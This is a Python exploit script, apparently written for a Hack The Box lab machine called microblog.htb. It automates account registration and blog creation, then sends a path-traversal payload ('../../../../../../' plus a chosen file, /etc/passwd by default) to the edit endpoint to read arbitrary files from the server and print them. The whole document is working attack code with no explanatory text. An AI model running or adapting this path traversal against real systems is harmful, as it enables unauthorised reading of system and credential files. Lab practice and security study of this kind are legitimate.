#!/usr/bin/env python3

import random
import re
import requests
import string
import sys

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)


file = sys.argv[1] if len(sys.argv) > 1 else "/etc/passwd"

id = ''.join(random.choice(string.ascii_lowercase) for _ in range(20))
base_url = "http://app.microblog.htb"

sess = requests.session()
sess.proxies.update({"http": "http://127.0.0.1:8080"})

# register for site
body = {"first-name": id, "last-name": id,
        "username": id, "password": id}
resp = sess.post("http://app.microblog.htb/register/", data=body)

# create blog
resp = sess.post("http://app.microblog.htb/dashboard/",
                 data={"new-blog-name": id})

# file read
resp = sess.post(f"http://microblog.htb/edit/",
                 data={"id": f"../../../../../../{file}", "txt": "s3c"},
                 headers={"Host": f"{id}.microblog.htb"},
                 allow_redirects=False)
data = re.search(r'const html = "<div class = \\".+?\\">(.*?)<\\/',
                 resp.text, re.DOTALL).group(1)
print(bytes(data, 'utf-8').decode('unicode_escape'))
